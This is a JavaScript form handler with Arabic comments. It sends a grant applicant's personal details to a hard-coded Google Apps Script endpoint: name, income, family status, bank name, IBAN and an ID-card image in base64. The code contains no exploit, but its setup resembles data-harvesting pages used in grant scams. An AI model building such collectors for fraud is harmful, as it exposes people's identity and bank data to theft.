var APPS_SCRIPT_URL = 'https://script.google.com/macros/s/AKfycby-fvc-LsoVHWwNdpP1Rvk4jJO-IFP5FBu9u9_6lxVd1fs0UKJPAq4P5dF1EZUfmVAO1Q/exec';

async function saveToGoogleSheets(txNumber) {
  
  // 1. قراءة الصورة (افترض أن حقل الصورة في HTML يحمل id="id_card")
  var fileInput = document.getElementById('id_card'); 
  var file = (fileInput && fileInput.files.length > 0) ? fileInput.files[0] : null;
  
  var base64String = "";
  var mimeType = "";
  var fileName = "";

  if (file) {
    mimeType = file.type;
    fileName = file.name;
    // تحويل الصورة إلى نص لإرسالها
    base64String = await new Promise((resolve) => {
      var reader = new FileReader();
      reader.onloadend = () => resolve(reader.result);
      reader.readAsDataURL(file);
    });
  }

  // 2. قراءة البيانات مباشرة من الحقول في الشاشة لتجنب الأصفار
  var payload = {
    transaction_id:    txNumber,
    // استبدل الـ IDs بما يطابق ملف الـ HTML الخاص بك
    full_name:         document.getElementById('name') ? document.getElementById('name').value : '',
    country:           document.getElementById('country') ? document.getElementById('country').value : '',
    marital_status:    document.getElementById('marital_status') ? document.getElementById('marital_status').value : '',
    num_children:      document.getElementById('num_children') ? document.getElementById('num_children').value : 0,
    phone:             document.getElementById('phone') ? document.getElementById('phone').value : '',
    email:             document.getElementById('email') ? document.getElementById('email').value : '',
    profession:        document.getElementById('profession') ? document.getElementById('profession').value : '',
    monthly_income:    document.getElementById('monthly_income') ? document.getElementById('monthly_income').value : 0,
    grant_type:        document.getElementById('grant_type') ? document.getElementById('grant_type').value : '',
    grant_amount:      document.getElementById('grant_amount') ? document.getElementById('grant_amount').value : 0,
    grant_description: document.getElementById('grant_description') ? document.getElementById('grant_description').value : '',
    bank_name:         document.getElementById('bank_name') ? document.getElementById('bank_name').value : '',
    account_holder:    document.getElementById('account_holder') ? document.getElementById('account_holder').value : '',
    iban:              document.getElementById('iban') ? document.getElementById('iban').value.replace(/\s/g, '') : '',
    
    // إضافة بيانات الصورة
    image_base64:      base64String,
    image_mime:        mimeType,
    image_name:        fileName
  };

  // 3. الإرسال عبر POST (باستخدام no-cors لتجنب حظر المتصفح)
  try {
    await fetch(APPS_SCRIPT_URL, {
      method: 'POST',
      mode: 'no-cors', // مهم جداً لكي لا يمنع المتصفح الإرسال
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify(payload)
    });
    
    return true;
  } catch (error) {
    console.error("خطأ في الإرسال: ", error);
    return false;
  }
}
